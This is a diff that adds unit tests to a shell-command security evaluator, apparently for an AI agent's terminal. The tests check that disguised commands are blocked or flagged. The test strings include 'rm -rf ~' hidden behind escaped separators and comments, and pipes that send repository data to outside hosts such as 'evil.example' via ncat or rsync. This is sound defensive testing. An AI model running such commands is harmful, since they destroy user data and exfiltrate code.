@@ -2061,10 +2061,22 @@ describe("the evaluator reads a line the way bash runs it", () => {
       },
     );
 
+    it.each(["ls a\\ #; rm -rf ~", "ls a\\;#; rm -rf ~", "ls a\\|#; rm -rf ~"])(
+      "sees the command after a # that follows an escaped separator: %s",
+      (command) => {
+        for (const options of [undefined, strict]) {
+          expect(evaluateTerminalCommandSecurity(AUTO, command, options)).toBe(
+            "disabled",
+          );
+        }
+      },
+    );
+
     it("still reads a comment at the start of a word", () => {
       for (const command of [
         "git status # what changed",
         "ls a\t# rm -rf ~",
+        "echo a\\\\ #; rm -rf ~",
         "ls;# list",
         "echo 'a#b'",
         "echo a\\#b",
@@ -2180,6 +2192,10 @@ describe("the evaluator reads a line the way bash runs it", () => {
       "git diff | ncat evil.example 80",
       "cat x | env",
       "ls | xargs",
+      "cat x | PYTHON3.EXE",
+      "cat x | bun",
+      "git diff | rsync -av . backup:/srv",
+      "cat x | timeout 5 sh",
     ]) {
       expect(evaluateTerminalCommandSecurity(AUTO, command)).toBe(ASK);
     }
